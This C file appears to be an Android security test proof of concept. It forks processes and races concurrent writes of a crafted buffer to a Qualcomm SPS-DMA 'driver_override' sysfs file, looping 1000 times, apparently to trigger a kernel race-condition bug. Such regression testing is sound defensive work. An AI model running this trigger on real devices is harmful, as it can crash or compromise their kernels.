/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#include <errno.h>
#include <fcntl.h>
#include <linux/ion.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>

#include "local_poc.h"

#define MAX_THREAD 1
int fd;
int cmd;
int status[MAX_THREAD];
char *buf;

void *threadEntry(void *arg) {
  int ret;
  int index = (int)(unsigned long)arg;

  if (index < 0 || index >= MAX_THREAD) goto failed;

  status[index] = 1;

  while (cmd == 0) {
    usleep(10);
  }

  if (cmd == -1) goto failed;

  usleep(10);
  write(fd, buf, 64);
failed:
  status[index] = 2;
  return NULL;
}

int main(int argc, char **argv) {
  int ret, i;
  pthread_t tid[MAX_THREAD];
  int pc = 2;

  int count = 0;

  while (pc-- > 0) fork();

  buf = (char *)malloc(4096);
  if (!buf) return -1;

  memset(buf, 0x0, 4096);
  for (i = 0; i < 62; i++) buf[i] = 'g';

retry:
  cmd = 0;
  for (i = 0; i < MAX_THREAD; i++) status[i] = 0;

  fd = open("/sys/devices/soc/7544000.qcom,sps-dma/driver_override", O_WRONLY);
  if (fd < 0) {
    return -1;
  }

  for (i = 0; i < MAX_THREAD; i++) {
    ret = pthread_create(&tid[i], NULL, threadEntry, (void *)(unsigned long)i);
    if (ret != 0) {
      cmd = -1;
      goto failed;
    }
  }

  while (status[0] != 1) {
    usleep(50);
  }

  cmd = 1;
  usleep(10);
  ret = write(fd, buf, 64);
  while (status[0] != 2) {
    usleep(50);
  }

failed:
  count++;
  close(fd);
  if (count < 1000) {
    goto retry;
  }
  return 0;
}
